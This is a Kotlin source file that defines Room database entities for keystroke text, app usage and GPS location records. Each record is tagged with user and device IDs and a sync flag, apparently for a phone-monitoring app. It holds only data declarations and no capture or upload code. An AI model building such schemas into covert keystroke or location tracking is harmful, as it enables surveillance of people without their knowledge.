package com.github.muneebwanee.dash.data.model  
  
import androidx.room.Entity  
import androidx.room.PrimaryKey  
import kotlinx.serialization.Serializable  
  
@Entity(tableName = "keystroke_data")  
@Serializable  
data class KeystrokeData(  
    @PrimaryKey(autoGenerate = true)  
    val id: Long = 0,  
    val text: String,  
    val packageName: String?,  
    val timestamp: Long,  
    val userId: String,  
    val deviceId: String,  
    val isSynced: Boolean = false  
)  
  
@Entity(tableName = "app_usage_data")  
@Serializable  
data class AppUsageData(  
    @PrimaryKey(autoGenerate = true)  
    val id: Long = 0,  
    val packageName: String,  
    val appName: String?,  
    val timestamp: Long,  
    val duration: Long = 0,  
    val userId: String,  
    val deviceId: String,  
    val isSynced: Boolean = false  
)  
  
@Entity(tableName = "location_data")  
@Serializable  
data class LocationData(  
    @PrimaryKey(autoGenerate = true)  
    val id: Long = 0,  
    val latitude: Double,  
    val longitude: Double,  
    val accuracy: Float,  
    val timestamp: Long,  
    val userId: String,  
    val deviceId: String,  
    val isSynced: Boolean = false  
)
